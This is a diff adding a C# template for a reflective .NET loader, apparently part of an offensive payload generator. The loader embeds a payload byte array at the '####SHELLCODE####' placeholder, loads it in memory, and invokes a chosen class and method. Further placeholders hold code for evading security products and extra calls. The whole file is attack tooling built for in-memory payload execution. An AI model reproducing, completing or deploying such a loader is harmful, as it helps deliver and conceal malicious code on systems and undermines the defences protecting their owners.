@@ -1,0 +1,154 @@
+using System;
+using System.Reflection;
+
+//####INCLUDE####
+
+//####DEFINE####
+
+namespace ReflectionLoader
+{
+    //####CODE####
+
+    public class Program
+    {
+        public static void Main(string[] args)
+        {
+            //####EVASION####
+
+            try
+            {
+                // Load the assembly from byte array
+                byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
+
+                //####CALL####
+                
+                Console.WriteLine("[+] Loading assembly...");
+                Assembly assembly = Assembly.Load(buf);
+                
+                // Get the specified type and method
+                string className = "####CLASS_NAME####";
+                string methodName = "####FUNCTION_NAME####";
+                
+                Console.WriteLine("[+] Looking for class: " + className);
+                Type type = assembly.GetType(className);
+                if (type == null)
+                {
+                    Console.WriteLine("[-] Class not found: " + className);
+                    
+                    // List available classes to help with debugging
+                    Console.WriteLine("[+] Available classes:");
+                    foreach (Type t in assembly.GetTypes())
+                    {
+                        Console.WriteLine("    " + t.FullName);
+                    }
+                    return;
+                }
+                
+                Console.WriteLine("[+] Looking for method: " + methodName);
+                MethodInfo method = type.GetMethod(methodName);
+                if (method == null)
+                {
+                    Console.WriteLine("[-] Method not found: " + methodName);
+                    
+                    // List available methods to help with debugging
+                    Console.WriteLine("[+] Available methods:");
+                    foreach (MethodInfo m in type.GetMethods())
+                    {
+                        Console.WriteLine("    " + m.Name);
+                    }
+                    return;
+                }
+                
+                // Get parameter info to properly handle arguments
+                ParameterInfo[] parameters = method.GetParameters();
+                Console.WriteLine("[+] Method has " + parameters.Length + " parameter(s)");
+                
+                object[] methodArgs;
+                
+                // Handle Main method that expects string[] args
+                if (parameters.Length == 1 && 
+                    parameters[0].ParameterType == typeof(string[]) && 
+                    parameters[0].Name == "args")
+                {
+                    string entryArgs = "####ENTRY_ARGS####";
+                    if (string.IsNullOrEmpty(entryArgs) || entryArgs == "####ENTRY_ARGS####")
+                    {
+                        // No arguments provided, pass empty string array
+                        methodArgs = new object[] { new string[0] };
+                        Console.WriteLine("[+] Passing empty string[] args");
+                    }
+                    else
+                    {
+                        // Parse arguments string into array using .NET 2.0 compatible method
+                        string[] argArray = entryArgs.Split(new char[] {' '});
+                        methodArgs = new object[] { argArray };
+                        Console.WriteLine("[+] Passing " + argArray.Length + " arguments to Main");
+                    }
+                }
+                else if (parameters.Length == 0)
+                {
+                    // Method takes no parameters
+                    methodArgs = new object[0];
+                    Console.WriteLine("[+] Method takes no parameters");
+                }
+                else
+                {
+                    // For other parameter patterns, pass the raw arguments
+                    string entryArgs = "####ENTRY_ARGS####";
+                    if (string.IsNullOrEmpty(entryArgs) || entryArgs == "####ENTRY_ARGS####")
+                    {
+                        Console.WriteLine("[-] Method requires parameters but none were provided");
+                        return;
+                    }
+                    
+                    if (parameters.Length == 1)
+                    {
+                        // If only one parameter, pass it directly
+                        methodArgs = new object[] { entryArgs };
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Method has multiple parameters which isn't supported in this template");
+                        return;
+                    }
+                }
+                
+                Console.WriteLine("[+] Executing " + className + "." + methodName);
+                object result = method.Invoke(null, methodArgs);
+                
+                // If the method returns a value, you can handle it here
+                if (result != null)
+                {
+                    Console.WriteLine("[+] Method returned: " + result.ToString());
+                }
+                else
+                {
+                    Console.WriteLine("[+] Method executed successfully");
+                }
+            }
+            catch (TargetParameterCountException ex)
+            {
+                Console.WriteLine("[-] Parameter count mismatch: " + ex.Message);
+            }
+            catch (ReflectionTypeLoadException ex)
+            {
+                Console.WriteLine("[-] Error loading types: " + ex.Message);
+                if (ex.LoaderExceptions != null)
+                {
+                    foreach (Exception loaderEx in ex.LoaderExceptions)
+                    {
+                        Console.WriteLine("    [-] " + loaderEx.Message);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Error: " + ex.Message);
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine("[-] Inner Exception: " + ex.InnerException.Message);
+                }
+            }
+        }
+    }
+}
